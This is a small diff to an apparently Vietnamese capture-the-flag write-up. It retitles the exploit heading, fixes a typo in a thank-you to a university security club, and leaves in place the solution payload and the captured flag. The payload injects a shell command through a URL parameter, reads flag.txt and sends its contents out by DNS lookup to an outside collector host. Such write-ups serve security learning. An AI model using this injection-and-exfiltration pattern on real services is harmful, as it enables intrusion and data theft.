@@ -82,10 +82,10 @@ Sau một hồi fuzz thì mình tìm đến `DNS`, vì hầu như ứng dụng w
 
 
 Nhưng mà loay hoay một hồi mình sài lệnh nslookup, dig, host, blabla nó vẫn ko work. Cuối cùng sài lệnh `ping` thì lại oke .
-## EXPLOIT
+## KHAI THÁC
 
 `` PAYLOAD: http://45.119.84.224:4000/CaptureSite?url[]=$(ping%20`cat%20flag.txt`.ekiajtf3.requestrepo.com)``
 
 ` FLAG: ChristCTF{R3v3r53_5h3ll_i5_v3ry_345y_5738246dhcbw}`
 
-### Cuối cùng xin cảm ơn câu lạc bộ ATTT của đại học PTIT đã tạo ra sân chơi hữu ích vào đúng dịp Noel, để ae ko có gấu vào chơi cho đỡ buổn.
+### Cuối cùng xin cảm ơn câu lạc bộ ATTT của đại học PTIT đã tạo ra sân chơi hữu ích vào đúng dịp Noel, để ae ko có gấu vào chơi cho đỡ buồn.
